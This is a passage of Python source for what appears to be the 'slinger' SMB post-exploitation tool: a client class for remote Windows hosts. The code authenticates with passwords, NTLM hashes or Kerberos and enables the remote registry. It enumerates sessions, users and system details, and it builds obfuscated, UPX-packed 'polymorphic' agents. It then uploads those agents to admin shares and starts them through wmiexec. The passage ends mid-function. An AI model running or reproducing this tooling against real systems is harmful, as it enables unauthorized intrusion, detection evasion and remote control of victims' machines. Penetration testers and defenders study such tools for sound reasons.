from slingerpkg.lib.schtasks import schtasks
from slingerpkg.lib.winreg import winreg
from slingerpkg.lib.atexec import atexec
from slingerpkg.lib.wmiexec import wmiexec
from slingerpkg.lib.scm import scm
from slingerpkg.lib.smblib import smblib
from slingerpkg.lib.secrets import secrets
from slingerpkg.lib.eventlog import EventLog
from slingerpkg.lib.named_pipes import NamedPipeEnumerator
from slingerpkg.lib.wmi_namedpipe import WMINamedPipeExec
from slingerpkg.lib.named_pipe_client import NamedPipeClientWin32, NamedPipeClientCtypes
from slingerpkg.utils.printlib import *
from slingerpkg.utils.common import *
from slingerpkg.lib.dcetransport import DCETransport

# Standard library imports used throughout
import datetime
import json
import os
import struct
import sys
import traceback
from pathlib import Path
from tabulate import tabulate

# Impacket imports
from impacket import smbconnection
from impacket.dcerpc.v5.rpcrt import DCERPCException
import slingerpkg.var.config as config

dialect_mapping = {
    0x02FF: "SMB 1.0",
    0x031F: "SMB 2.0.2",
    0x0302: "SMB 2.1",
    0x0300: "SMB 3.0",
    0x0311: "SMB 3.0.2",
    0x0312: "SMB 3.1.1",
}


class SlingerClient(
    winreg,
    schtasks,
    scm,
    smblib,
    secrets,
    atexec,
    wmiexec,
    EventLog,
    WMINamedPipeExec,
    DCETransport,
):
    def __init__(
        self, host, username, password, domain, port=445, ntlm_hash=None, use_kerberos=False
    ):
        schtasks.__init__(self)
        winreg.__init__(self)
        scm.__init__(self)
        smblib.__init__(self)
        secrets.__init__(self)
        atexec.__init__(self)
        wmiexec.__init__(self)
        EventLog.__init__(self)
        WMINamedPipeExec.__init__(self)
        DCETransport.__init__(self, host, username, port, None)  # SMB connection set later
        self.host = host
        self.username = username
        self.password = password
        self.domain = domain
        self.port = port
        self.ntlm_hash = ntlm_hash
        self.use_kerberos = use_kerberos
        self.conn = None
        self.share = None
        self.current_path = ""
        self.tree_id = None
        self.relative_path = ""
        self.is_connected_to_share = False
        self.is_logged_in = False
        self.port = port
        self.session_start_time = datetime.datetime.now()
        self.dialect = None
        self.smb_version = None
        self.dce_transport = None
        self.srvsvc_pipe = None
        self.wkssvc_pipe = None

    def setup_dce_transport(self):
        """
        Sets up or reuses the DCE transport for RPC communication.
        """
        if not self.dce_transport or not self.dce_transport.is_connected:
            self.dce_transport = DCETransport(self.host, self.username, self.port, self.conn)
            # Timeout is set on the SMB connection, not DCE transport
        else:
            print_debug("Reusing existing DCE transport.")

    def login(self):
        print_info(f"Connecting to {self.host}:{self.port}...")
        auth_timeout = get_config_value("smb_auth_timeout")
        try:
            self.conn = smbconnection.SMBConnection(
                self.host, self.host, sess_port=self.port, timeout=auth_timeout
            )
        except Exception as e:
            print_debug(str(e), sys.exc_info())
            if "Connection error" in str(e):
                print_bad(f"Failed to connect to {self.host}:{self.port}")
                sys.exit()

        if self.conn is None or self.conn == "":
            self.is_logged_in = False
            raise Exception("Failed to create SMB connection.")

        # Ensure timeout is set on connection object for authentication
        self.conn._timeout = int(auth_timeout)

        try:
            if self.use_kerberos:
                self.conn.kerberosLogin(
                    self.username,
                    self.password,
                    domain=self.domain,
                    lmhash="",
                    nthash="",
                    aesKey="",
                    TGT=None,
                    TGS=None,
                )
            elif self.ntlm_hash:
                # get nt and lm hashes from ntlm hash
                try:
                    nt_hash = self.ntlm_hash.split(":")[1]
                    lm_hash = self.ntlm_hash.split(":")[0]
                except IndexError:
                    print_bad("Invalid NTLM hash. Format should be LM:NT or :NT")
                    sys.exit()
                self.conn.login(
                    self.username, self.password, domain=self.domain, lmhash=lm_hash, nthash=nt_hash
                )
            else:
                self.conn.login(self.username, self.password, domain=self.domain)
            print_good(f"Successfully logged in to {self.host}:{self.port}")

            # Update DCE transport with established SMB connection
            self.conn = self.conn  # Update the DCE transport SMB connection

            GRN_BLD = "\033[1;32m"
            RST = "\033[0m"
            print("\nStart Time: " + GRN_BLD + str(self.session_start_time) + RST + "\n")
        except Exception as e:
            print_debug(str(e), sys.exc_info())
            if "STATUS_LOGON_FAILURE" in str(e):
                print_bad(f"Authentication Failed {self.host}:{self.port}")
                sys.exit()
            elif "STATUS_ACCOUNT_RESTRICTION" in str(e):
                print_good("Login Successful")
                print_bad(f"Account is restricted {self.host}:{self.port}")
                sys.exit()
            else:
                print_bad(f"Login Failed {self.host}:{self.port}")
                print_log(str(e) + "\n" + str(sys.exc_info()))
            sys.exit()
        # set a large timeout
        self.conn.timeout = get_config_value("smb_conn_timeout")
        self.is_logged_in = True
        self.dialect = self.conn.getDialect()
        self.smb_version = dialect_mapping.get(self.dialect, "Unknown")
        try:
            self.dce_transport = DCETransport(self.host, self.username, self.port, self.conn)
        except Exception as e:
            print_bad(f"Unable to setup DCE transport: {e}")
            raise e

        self.dce_transport._enable_remote_registry()
        # self.setup_remote_registry(args=None)

    # handle exit
    def exit(self):
        try:
            self.dce_transport._disconnect()
            try:
                self.conn.logoff()
            except Exception as e:
                pass
                # print_debug(str(e), sys.exc_info())
            GRN_BLD = "\033[1;32m"
            RST = "\033[0m"
            CURRENT_TIME = datetime.datetime.now()
            print("\nStop Time: " + GRN_BLD + str(CURRENT_TIME) + RST + "\n")

        except Exception as e:
            print_debug(str(e), sys.exc_info())

        # Cleanup WMI connections if they exist
        try:
            if hasattr(self, "_wmi_services") and hasattr(self, "cleanup_wmi"):
                print_debug("Cleaning up WMI connections...")
                self.cleanup_wmi()
        except Exception as e:
            print_debug(f"WMI cleanup error: {e}")

        self.conn = None

    def is_connected_to_remote_share(self):
        return self.conn and self.is_connected_to_share

    def info(self, args=None):
        dialect_mapping = {
            0x02FF: "SMB 1.0",
            0x031F: "SMB 2.0.2",
            0x0302: "SMB 2.1",
            0x0300: "SMB 3.0",
            0x0311: "SMB 3.0.2",
            0x0312: "SMB 3.1.1",
        }
        dialect = self.conn.getDialect()
        smb_version = dialect_mapping.get(dialect, "Unknown")
        print_log(f"Remote Name: {self.conn.getRemoteName()}")
        print_log(f"Remote Host: {self.conn.getRemoteHost()}")
        print_log(f"SMB Version: {smb_version}")
        print_log(f"Connected: {self.is_connected_to_share}")
        if self.is_connected_to_share:
            print_log(f"Share: {self.share}")
            print_log(f"Current Path: {self.current_path}")

        print_log(f"Logged in: {self.is_logged_in}")
        print_log(f"Total time of session: {datetime.datetime.now() - self.session_start_time}")

    def history_handler(self, args):
        """Display command history from the slinger history file"""
        try:
            from slingerpkg.utils.common import get_config_value
            from slingerpkg.utils.printlib import print_log, print_bad, print_info

            # Get history file location from config
            hist_file = os.path.expanduser(get_config_value("History_File"))

            # Check if history file exists
            if not os.path.exists(hist_file):
                print_bad(f"History file not found: {hist_file}")
                return

            # Read history file
            with open(hist_file, "r") as f:
                lines = f.readlines()

            # Get the number of lines to display (default 15)
            num_lines = args.n if hasattr(args, "n") else 15

            # Get last N lines
            history_lines = lines[-num_lines:]

            # Display history
            print_info(f"Last {len(history_lines)} commands:")
            for i, line in enumerate(history_lines, start=len(lines) - len(history_lines) + 1):
                print_log(f"{i:4d}  {line.rstrip()}")

        except Exception as e:
            from slingerpkg.utils.printlib import print_bad

            print_bad(f"Failed to read history: {e}")

    def who(self, args=None):
        """
        Executes the 'who' command to retrieve session information.
        Reuses the transport and resets it if needed.
        """
        try:
            # Setup or reuse transport
            self.setup_dce_transport()
            if "srvsvc" not in self.dce_transport.pipe:
                self.dce_transport._connect("srvsvc")
            # Execute the 'who' command
            resp = self.dce_transport._who()
            for session in resp["InfoStruct"]["SessionInfo"]["Level10"]["Buffer"]:
                print_log(
                    "host: %15s, user: %5s, active: %5d, idle: %5d"
                    % (
                        session["sesi10_cname"][:-1],
                        session["sesi10_username"][:-1],
                        session["sesi10_time"],
                        session["sesi10_idle_time"],
                    )
                )
        except DCERPCException as e:
            print_debug(str(e), sys.exc_info())
            print_bad(f"Failed to list sessions: {e}")
            raise e
        except Exception as e:
            # Reset the transport on unexpected errors
            print_debug(f"Unexpected error: {str(e)}. Resetting transport.", sys.exc_info())
            self.dce_transport._disconnect()
            self.setup_dce_transport()
            raise e

    def enum_server_disk(self, args=None):
        try:
            self.setup_dce_transport()
            self.dce_transport._connect("srvsvc")

            response = self.dce_transport._enum_server_disk()
            if response["ErrorCode"] == 0:  # Checking for successful response
                disk_enum = response["DiskInfoStruct"]["Buffer"]
                print_log("Disk Drives:")
                for disk in disk_enum:
                    print_log(f"  {disk['Disk']}  ", end="")
                print_log()
            else:
                print_log(f"Error: {response['ErrorCode']}")
        except Exception as e:
            print_debug(str(e), sys.exc_info())
            print_log(f"An error occurred: {str(e)}")
            raise e

    def enum_logons(self, args=None):
        self.setup_dce_transport()
        self.dce_transport._connect("wkssvc")
        response = self.dce_transport._enum_logons()
        print_info("Logged on Users:")
        for user_info in response["UserInfo"]["WkstaUserInfo"]["Level1"]["Buffer"]:
            print_log(f"Username: {user_info['wkui1_username']}")

    def enum_sys(self, args=None):
        self.setup_dce_transport()
        self.dce_transport._connect("wkssvc")
        response = self.dce_transport._enum_sys()
        # Assuming you have a response from NetrWkstaGetInfo
        info = response["WkstaInfo"]["WkstaInfo102"]

        print_log("Workstation Information:")
        print_log(f"Platform ID: {info['wki102_platform_id']}")
        print_log(f"Computer Name: {info['wki102_computername']}")
        print_log(f"Domain Name: {info['wki102_langroup']}")
        print_log(f"Version Major: {info['wki102_ver_major']}")
        print_log(f"Version Minor: {info['wki102_ver_minor']}")
        print_log(f"Logged-on Users: {info['wki102_logged_on_users']}")

    def enum_transport(self, args=None):
        self.setup_dce_transport()
        self.dce_transport._connect("wkssvc")
        response = self.dce_transport._enum_transport()
        transports = response["TransportInfo"]["WkstaTransportInfo"]["Level0"]["Buffer"]

        print_info("Transport Information:")
        for transport in transports:
            print_log(f"Quality Of Service: {transport['wkti0_quality_of_service']}")
            print_log(f"Number of VCs: {transport['wkti0_number_of_vcs']}")

            # Decode the transport name and address from bytes to string
            transport_name = transport["wkti0_transport_name"]
            transport_address = transport["wkti0_transport_address"]

            print_log(f"Transport Name: {transport_name}")
            readable_mac_address = ":".join(
                transport_address[i : i + 2] for i in range(0, len(transport_address), 2)
            )
            print_log(f"Readable Transport Address (MAC): {readable_mac_address}")
            print_log(f"WAN ISH: {transport['wkti0_wan_ish']}")
            print_log()

    def enum_info(self, args=None):
        self.setup_dce_transport()
        self.dce_transport._connect("srvsvc")
        response = self.dce_transport._enum_info()
        # print_log(response.dump())
        print_info("Server Info:")
        info = response["InfoStruct"]["ServerInfo101"]
        print_log(f"Server name: {info['sv101_name']}")
        print_log(f"Server platform id: {info['sv101_platform_id']}")
        print_log(f"Server version: {info['sv101_version_major']}.{info['sv101_version_minor']}")
        print_log(f"Server type: {info['sv101_type']}")
        print_log(f"Server comment: {info['sv101_comment']}")

        # Processor Arch
        response = self.get_processor_architecture()
        print_info(f"Processor Architecture:")
        print_log(f"Architecture: {response}-bit")

        # Enumerate the server disk drives
        print_info("Server Disk Info:")
        self.enum_server_disk()

        # Processor Info
        print_info("Processor Info:")
        response = self._sys_proc_info(args, echo=False)
        print_log(f"Processor Name:\t{response['ProcessorNameString']}")
        print_log(f"Processor ID:\t{response['Identifier']}")
        print_log(f"Vendor ID:\t{response['VendorIdentifier']}")

        # System time
        print_info("System Time:")
        response = self._sys_time_info(args, echo=False)
        # convert the time to a readable format
        last_known_good_time_hex = response["LastKnownGoodTime"]  # Example: '0x1db6cdf8f0b399a'
        # Convert hex string to an integer
        last_known_good_time_int = int(last_known_good_time_hex, 16)
        # Convert Windows File Time to seconds since UNIX epoch
        # Windows File Time is the number of 100-nanosecond intervals since January 1, 1601 UTC
        unix_time = (last_known_good_time_int - 116444736000000000) // 10000000
        # Convert to a human-readable datetime
        sys_time = datetime.datetime.fromtimestamp(unix_time, tz=datetime.timezone.utc)
        print_log(f"Time (UTC):\t{sys_time}")
        last_shutdown_str = self._sys_shutdown_info(args, hex_dump=True, echo=False)
        last_shutdown = datetime.datetime.strptime(last_shutdown_str, "%Y-%m-%d %H:%M:%S").replace(
            tzinfo=datetime.timezone.utc
        )
        print_log(f"Last Shutdown Time (UTC): {last_shutdown_str}")
        # calc uptime sys_time - last_shutdown
        uptime = sys_time - last_shutdown
        uptime_str = str(uptime).split(".")[0]
        print_log(f"Uptime: {uptime_str}")

    def get_server_time(self, args=None):
        # print local date and time
        time = datetime.datetime.now()
        date = datetime.date.today()
        print_info(f"Local Time: {time.hour}:{time.minute}:{time.second}")
        print_info(f"Local Date: {date.month}/{date.day}/{date.year}")

        try:
            self.setup_dce_transport()
            self.dce_transport._connect("srvsvc")
            response = self.dce_transport._fetch_server_time()
            if response["ErrorCode"] == 0:  # Checking for successful response
                tod_info = response["BufferPtr"]
                # Server current time
                hours = tod_info["tod_hours"]
                minutes = tod_info["tod_mins"]
                seconds = tod_info["tod_secs"]
                current_time = f"{hours:02d}:{minutes:02d}:{seconds:02d}"

                # Server current date
                day = tod_info["tod_day"]
                month = tod_info["tod_month"]
                year = tod_info["tod_year"]
                weekday = tod_info["tod_weekday"]
                weekdays = [
                    "Sunday",
                    "Monday",
                    "Tuesday",
                    "Wednesday",
                    "Thursday",
                    "Friday",
                    "Saturday",
                ]
                current_date = f"{month:02d}/{day:02d}/{year}"
                day_name = weekdays[weekday] if 0 <= weekday < 7 else "Unknown"

                # Server uptime
                uptime_seconds = int(tod_info["tod_elapsedt"]) // 1000
                uptime_days = uptime_seconds // 86400
                uptime_hours = (uptime_seconds % 86400) // 3600
                uptime_minutes = (uptime_seconds % 3600) // 60
                if uptime_days > 0:
                    uptime = f"{uptime_days} days, {uptime_hours} hours, {uptime_minutes} minutes"
                else:
                    uptime = f"{uptime_hours} hours, {uptime_minutes} minutes"

                # Server timezone
                tz_minutes = int(tod_info["tod_timezone"])
                tz_hours, tz_mins = divmod(abs(tz_minutes), 60)
                tz_sign = "+" if tz_minutes >= 0 else "-"
                timezone = f"UTC{tz_sign}{tz_hours:02d}:{tz_mins:02d}"

                # Display the extracted information
                print_info(f"Server Time: {current_time}")
                print_info(f"Server Date: {current_date} ({day_name})")
                print_info(f"Server Uptime: {uptime}")
                print_info(f"Server Timezone: {timezone}")

            else:
                print_log(f"Error: {response['ErrorCode']}")
        except Exception as e:
            print_debug(str(e), sys.exc_info())
            print_log(f"An error occurred: {str(e)}")
            raise e

    def check_if_connected(self):
        if self.conn is None or self.is_connected_to_remote_share() is False:
            print_warning("No share is connected. Use the 'use' command to connect to a share.")
            self.is_connected_to_share = False
            return False
        self.is_connected_to_share = True
        return True

    def downloads_list_handler(self, args):
        """Handle 'downloads list' command to show active resumable downloads"""
        from slingerpkg.lib.download_state import DownloadStateManager
        from tabulate import tabulate

        try:
            active_downloads = DownloadStateManager.list_active_downloads()

            if not active_downloads:
                print_info("No active resumable downloads found.")
                return

            print_info(f"Found {len(active_downloads)} active resumable downloads:")

            # Prepare table data
            table_data = []
            for download in active_downloads:
                local_path = download["local_path"]
                remote_path = download["remote_path"]
                progress = download["progress"]
                bytes_downloaded = self.sizeof_fmt(download["bytes_downloaded"])
                total_size = self.sizeof_fmt(download["total_size"])
                last_modified = (
                    download["last_modified"][:19] if download["last_modified"] else "Unknown"
                )

                # Truncate paths if too long
                if len(local_path) > 40:
                    local_path = "..." + local_path[-37:]
                if len(remote_path) > 40:
                    remote_path = "..." + remote_path[-37:]

                table_data.append(
                    [
                        local_path,
                        remote_path,
                        f"{progress:.1f}%",
                        f"{bytes_downloaded}/{total_size}",
                        last_modified,
                    ]
                )

            headers = ["Local Path", "Remote Path", "Progress", "Downloaded", "Last Modified"]
            print(tabulate(table_data, headers=headers, tablefmt="grid"))

        except Exception as e:
            print_debug(f"Error listing downloads: {e}", sys.exc_info())
            print_bad(f"Failed to list downloads: {e}")

    def downloads_cleanup_handler(self, args):
        """Handle 'downloads cleanup' command to clean up download states"""
        from slingerpkg.lib.download_state import DownloadStateManager

        try:
            if not args.force:
                response = input("Clean up completed and stale download states? [y/N]: ")
                if response.lower() not in ["y", "yes"]:
                    print_info("Cleanup cancelled.")
                    return

            # Clean up completed downloads
            completed_count = DownloadStateManager.cleanup_completed_downloads()
            print_info(f"Cleaned up {completed_count} completed downloads.")

            # Clean up stale downloads
            max_age = getattr(args, "max_age", 7)
            stale_count = DownloadStateManager.cleanup_stale_downloads(max_age)
            print_info(f"Cleaned up {stale_count} stale downloads (older than {max_age} days).")

            total_cleaned = completed_count + stale_count
            if total_cleaned > 0:
                print_good(f"Total cleaned up: {total_cleaned} download state files.")
            else:
                print_info("No download states needed cleanup.")

        except Exception as e:
            print_debug(f"Error during cleanup: {e}", sys.exc_info())
            print_bad(f"Failed to cleanup downloads: {e}")

    def eventlog_handler(self, args):
        """Handle eventlog commands"""
        print_debug(f"Eventlog action: {args.eventlog_action}")
        try:
            # Handle different eventlog actions using self methods
            if args.eventlog_action == "list":
                print_verbose("Listing Event Logs...")
                self.list_event_logs(args)
            elif args.eventlog_action == "query":
                print_verbose("Querying Event Log: " + args.log)
                self.query_event_log(args)
            elif args.eventlog_action == "check":
                print_verbose("Checking Log: " + args.log)
                self.check_event_log(args.log)
            else:
                print_bad(f"Unknown eventlog action: {args.eventlog_action}")

        except Exception as e:
            print_bad(f"EventLog error: {e}")
            print_debug(f"Traceback: {traceback.format_exc()}")

    def reconnect_handler(self, args):
        """Reconnect to the server"""
        try:
            print_info("Reconnecting to the server...")

            # Store current connection info
            host = self.host
            username = self.username
            password = self.password
            domain = self.domain
            ntlm_hash = self.ntlm_hash
            current_share = self.share if hasattr(self, "share") else None
            current_path = getattr(self, "current_path", None) if current_share else None

            # Close existing connection
            try:
                if hasattr(self, "conn") and self.conn:
                    self.conn.close()
            except:
                pass

            # Create new connection
            self.conn = smbconnection.SMBConnection(host, host, sess_port=445)

            # Re-authenticate
            if ntlm_hash:
                lmhash, nthash = ntlm_hash.split(":")
                self.conn.login(username, password, domain, lmhash, nthash)
            else:
                self.conn.login(username, password, domain)

            # Try to reconnect to the original share if we had one
            if current_share:
                try:
                    self.conn.connectTree(current_share)
                    self.share = current_share
                    self.is_connected_to_share = True
                    print_good(f"Reconnected to share: {current_share}")

                    # Try to change back to the original path
                    if current_path and current_path != "/":
                        try:
                            self.cd_no_output(current_path)
                            print_info(
                                f"Current directory: {getattr(self, 'current_path', 'Unknown')}"
                            )
                        except:
                            print_warning(f"Could not change back to original path: {current_path}")
                            print_info(
                                f"Current directory: {getattr(self, 'current_path', 'Unknown')}"
                            )

                except Exception as e:
                    print_bad(f"Failed to reconnect to share {current_share}: {e}")
                    self.is_connected_to_share = False
            else:
                print_good("Reconnected to server")

        except Exception as e:
            print_bad(f"Failed to reconnect: {e}")

    def agent_handler(self, args):
        """Handle agent commands for cooperative agent building"""
        try:
            # Import the agent builder

            print_debug("Starting agent_handler execution")
            print_debug(f"Current file: {__file__}")
            print_debug(f"Python path: {sys.path}")

            # Try direct import first (since we copied the file to slingerpkg/lib)
            try:
                from slingerpkg.lib.cooperative_agent import build_cooperative_agent, AgentBuilder

                print_debug("Successfully imported from slingerpkg.lib.cooperative_agent")
            except ImportError as import_error:
                print_debug(f"Direct import failed: {import_error}")
                print_debug("Attempting fallback import path")

                # Fallback: Add lib directory to path for cooperative_agent import
                lib_path = os.path.join(
                    os.path.dirname(os.path.dirname(os.path.dirname(__file__))), "lib"
                )
                print_debug(f"Trying lib path: {lib_path}")
                if lib_path not in sys.path:
                    sys.path.insert(0, lib_path)

                from cooperative_agent import build_cooperative_agent, AgentBuilder

                print_debug("Successfully imported from fallback path")

            # Handle case where no subcommand was provided
            if args.agent_command is None:
                # Print the agent help menu
                print_info("Slinger Agent Management")
                print_log("")
                print_log("Available Commands:")
                print_log("  build    - Build polymorphic C++ agents")
                print_log("  info     - Show builder configuration and status")
                print_log("  deploy   - Deploy agent to target system")
                print_log("  list     - List all deployed agents")
                print_log("  use      - Connect to deployed agent")
                print_log("  rename   - Rename deployed agent")
                print_log("  check    - Check if agent is running")
                print_log("  kill     - Terminate running agent")
                print_log("  rm       - Remove agent from registry")
                print_log("  update   - Update agent metadata")
                print_log("  start    - Start stopped agent")
                print_log("")
                print_info("Use 'agent <command> --help' for detailed command help")
                return

            if args.agent_command == "build":
                # Handle dry run mode
                if hasattr(args, "dry_run") and args.dry_run:
                    print_info("Checking build readiness (dry run)...")

                    # Get the project root directory - go up from slingerpkg/lib/slingerclient.py
                    current_file_dir = os.path.dirname(__file__)  # slingerpkg/lib
                    slingerpkg_dir = os.path.dirname(current_file_dir)  # slingerpkg
                    src_dir = os.path.dirname(slingerpkg_dir)  # src
                    base_path = os.path.dirname(src_dir)  # project root

                    print_debug(f"Calculated base_path for dry-run: {base_path}")
                    print_debug(f"Expected lib path: {os.path.join(base_path, 'lib')}")

                    builder = AgentBuilder(base_path)
                    deps = builder.check_build_dependencies()

                    print_log(f"Architecture: {args.arch}")
                    print_log(
                        f"Encryption: {'Enabled' if args.encryption and not args.no_encryption else 'Disabled'}"
                    )
                    print_log(f"Debug mode: {'Enabled' if args.debug else 'Disabled'}")

                    if deps.get("cmake", False) and deps.get("cpp_compiler", False):
                        print_good("\n✓ All dependencies available - ready to build")
                        print_info("Run without --dry-run to actually build the agent")
                    else:
                        print_bad("\n✗ Missing dependencies:")
                        if not deps.get("cmake", False):
                            print_log("  ✗ CMake not found")
                        if not deps.get("cpp_compiler", False):
                            print_log("  ✗ C++ compiler not found")
                    return

                print_info("Building cooperative agent...")

                # Show pipe name configuration
                custom_pipe = getattr(args, "pipe", None)
                if custom_pipe:
                    print_info(f"Using custom pipe name: {custom_pipe}")
                else:
                    print_info("Using time-based random pipe name (determined at runtime)")

                # Handle encryption settings
                encryption = args.encryption and not args.no_encryption
                print_debug(f"Encryption enabled: {encryption}")

                # Determine output directory
                output_dir = (
                    args.output_dir if hasattr(args, "output_dir") and args.output_dir else None
                )
                print_debug(f"Output directory: {output_dir}")

                # Get the project root directory for building - same calculation as dry-run
                current_file_dir = os.path.dirname(__file__)  # slingerpkg/lib
                slingerpkg_dir = os.path.dirname(current_file_dir)  # slingerpkg
                src_dir = os.path.dirname(slingerpkg_dir)  # src
                base_path = os.path.dirname(src_dir)  # project root

                print_debug(f"Calculated base_path for build: {base_path}")
                print_debug(
                    f"Template directory: {os.path.join(base_path, 'lib', 'agent_templates')}"
                )

                # Build the agent(s)
                passphrase_arg = getattr(args, "passphrase", None)
                obfuscate_arg = getattr(args, "obfuscate", False)
                upx_arg = getattr(args, "upx", None)
                custom_name_arg = getattr(args, "name", None)
                print_debug(
                    f"Starting build with arch={args.arch}, encryption={encryption}, debug={args.debug}, passphrase={'<set>' if passphrase_arg else 'None'}, obfuscate={obfuscate_arg}, upx={upx_arg}, name={custom_name_arg}"
                )
                built_agents = build_cooperative_agent(
                    arch=args.arch,
                    encryption=encryption,
                    debug=args.debug,
                    base_path=base_path,
                    custom_pipe_name=getattr(args, "pipe", None),
                    custom_binary_name=custom_name_arg,
                    passphrase=passphrase_arg,
                    obfuscate=obfuscate_arg,
                    upx_path=upx_arg,
                )

                if built_agents:
                    print_good(f"Successfully built {len(built_agents)} agent(s):")
                    for agent_path in built_agents:
                        file_size = os.path.getsize(agent_path) if os.path.exists(agent_path) else 0
                        print_log(f"  {agent_path} ({file_size:,} bytes)")

                    # Show pipe name guidance
                    if getattr(args, "pipe", None):
                        print_info(f"\n💡 Agents built with custom pipe name: {args.pipe}")
                        print_info(f"   Pipe name automatically used during deployment")
                        print_info(f"   Deploy with: agent deploy <agent.exe> --path \\\\ --start")
                    else:
                        print_info("\n💡 These agents use time-based random pipe names")
                        print_info("   The actual pipe name will be determined when the agent runs")
                        print_info("   Deploy with: agent deploy <agent.exe> --path \\\\ --start")

                    print_info(
                        "   Use 'agent use <id>' to connect (pipe name tracked automatically)"
                    )

                else:
                    print_bad("Failed to build agents. Check build dependencies.")
                    print_info("Required: CMake, C++ compiler (MSVC/MinGW)")

            elif args.agent_command == "info":
                print_info("Cooperative Agent Builder Information")

                # Get the project root directory - same calculation as build
                current_file_dir = os.path.dirname(__file__)  # slingerpkg/lib
                slingerpkg_dir = os.path.dirname(current_file_dir)  # slingerpkg
                src_dir = os.path.dirname(slingerpkg_dir)  # src
                base_path = os.path.dirname(src_dir)  # project root

                print_debug(f"Calculated base_path for info: {base_path}")

                builder = AgentBuilder(base_path)
                info = builder.get_build_info()

                print_log(f"Template Directory: {info['template_dir']}")
                print_log(f"Build Directory: {info['build_dir']}")
                print_log(f"Output Directory: {info['output_dir']}")
                print_log(f"Supported Architectures: {', '.join(info['supported_architectures'])}")

                print_log("Build Dependencies:")
                deps = info["dependencies"]
                cmake_status = "✓" if deps["cmake_available"] else "✗"
                compiler_status = "✓" if deps["cpp_compiler_available"] else "✗"
                print_log(
                    f"  {cmake_status} CMake: {'Available' if deps['cmake_available'] else 'Not found'}"
                )
                print_log(
                    f"  {compiler_status} C++ Compiler: {deps['compiler_found'] if deps['cpp_compiler_available'] else 'Not found'}"
                )

                print_log("Template Files:")
                for template in info["template_files"]:
                    print_log(f"  ✓ {template}")

                print_log("Current Build Configuration:")
                print_log(f"  Encryption Seed: {info['encryption_seed']}")
                print_log(f"  Layout Seed: {info['layout_seed']}")

                # Show build readiness
                if deps["cmake_available"] and deps["cpp_compiler_available"]:
                    print_good("\n✓ System ready for agent building")
                else:
                    print_warning("\n⚠ Missing build dependencies - install CMake and C++ compiler")

            elif args.agent_command == "deploy":
                self.agent_deploy_handler(args)

            elif args.agent_command == "list":
                self.agent_list_handler(args)

            elif args.agent_command == "use":
                self.agent_use_handler(args)

            elif args.agent_command == "rename":
                self.agent_rename_handler(args)

            elif args.agent_command == "check":
                self.agent_check_handler(args)

            elif args.agent_command == "kill":
                self.agent_kill_handler(args)

            elif args.agent_command == "rm":
                self.agent_rm_handler(args)

            elif args.agent_command == "reset":
                self.agent_reset_handler(args)

            elif args.agent_command == "update":
                self.agent_update_handler(args)

            elif args.agent_command == "start":
                self.agent_restart_handler(args)

            else:
                print_bad(f"Unknown agent command: {args.agent_command}")
                print_info(
                    "Available commands: build, info, deploy, list, use, rename, check, kill, rm, reset, update, start"
                )

        except ImportError as e:
            print_bad(f"Agent builder not available: {e}")
            print_debug(f"ImportError details: {e}")
            print_debug(f"Current working directory: {os.getcwd()}")
            print_debug(f"__file__ path: {__file__}")
            print_info("Ensure cooperative_agent.py is in lib/ directory")
        except Exception as e:
            print_bad(f"Agent command failed: {e}")
            print_debug(f"Exception type: {type(e).__name__}")
            print_debug(f"Exception details: {e}")
            if hasattr(args, "debug") and args.debug:

                print_debug("Full traceback:")
                traceback.print_exc()

    def agent_deploy_handler(self, args):
        """Handle agent deployment to target system"""
        try:
            import random
            import string
            from slingerpkg.utils.printlib import (
                print_info,
                print_good,
                print_bad,
                print_warning,
                print_log,
                print_debug,
                print_verbose,
            )

            # Check prerequisites
            if not self.is_logged_in:
                print_bad("Not logged in. Please authenticate first.")
                return

            if not self.is_connected_to_share:
                print_bad("Not connected to a share. Use 'connect <share>' first.")
                print_info("Example: connect C$")
                return

            # Validate agent file exists
            if not os.path.exists(args.agent_path):
                print_bad(f"Agent file not found: {args.agent_path}")
                return

            # Generate agent name if not provided
            if args.name:
                agent_name = args.name
                if not agent_name.endswith(".exe"):
                    agent_name += ".exe"
            else:
                # Generate random name
                agent_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
                agent_name = f"slinger_{agent_id}.exe"

            print_info(f"Deploying agent: {os.path.basename(args.agent_path)}")
            print_info(f"Current share: {self.share}")
            print_info(f"Target path: {args.path}")
            print_info(f"Agent name: {agent_name}")

            # Use existing upload functionality - args.path is relative to current share
            target_path = args.path.rstrip("\\")
            if target_path and not target_path.endswith("\\"):
                remote_path = f"{target_path}\\{agent_name}"
            else:
                remote_path = agent_name

            print_info(f"Uploading to: {self.share}\\{remote_path}")

            try:
                # Use the existing upload method from smblib
                self.upload(args.agent_path, remote_path)
                print_good(f"✓ Agent uploaded successfully")

                # Resolve share to disk path for proper path construction
                share_disk_path = self._resolve_share_path(self.share)

                # Build full execution path using resolved share path
                if share_disk_path:
                    # Use resolved disk path (e.g., ADMIN$ -> C:\Windows)
                    # Strip leading backslash from remote_path to avoid C:\Windows\\file.exe
                    clean_remote = remote_path.lstrip("\\")
                    full_path = f"{share_disk_path}\\{clean_remote}"
                elif self.share.endswith("$") and len(self.share) == 2:
                    # Fallback for drive shares like C$, D$ if resolution failed
                    drive = self.share[:-1] + ":"
                    clean_remote = remote_path.lstrip("\\")
                    full_path = f"{drive}\\{clean_remote}"
                else:
                    # Last resort fallback
                    print_warning(
                        f"Could not resolve share path for '{self.share}', using fallback"
                    )
                    clean_remote = remote_path.lstrip("\\")
                    full_path = f"C:\\{clean_remote}"

                # Normalize path - replace any double backslashes and ensure single backslashes
                full_path = full_path.replace("\\\\", "\\")  # Clean up double slashes

                # Prepare agent info for registry (save regardless of start success)
                agent_id = agent_name.replace(".exe", "")

                # Determine pipe name: --pipe flag > build registry > discovery placeholder
                build_info = self._lookup_build_registry(args.agent_path)
                if hasattr(args, "pipe") and args.pipe:
                    pipe_name = args.pipe
                    pipe_source = "flag"
                elif build_info and build_info.get("pipe_name"):
                    pipe_name = build_info["pipe_name"]
                    pipe_source = "registry"
                else:
                    # For agents without known pipe names, use placeholder that will be discovered later
                    pipe_name = f"slinger_agent_{agent_id}"  # placeholder, will be discovered
                    pipe_source = "placeholder"

                # Get XOR key from build registry (encryption_seed & 0xFF)
                xor_key = None
                if build_info and "encryption_seed" in build_info:
                    xor_key = build_info["encryption_seed"] & 0xFF

                # Get passphrase and auth status from build registry
                passphrase = None
                auth_enabled = False
                if build_info:
                    passphrase = build_info.get("passphrase")
                    auth_enabled = build_info.get("auth_enabled", False)

                # Start agent if requested
                process_id = None
                agent_status = "uploaded"
                if args.start:
                    method = getattr(args, "method", "wmiexec")
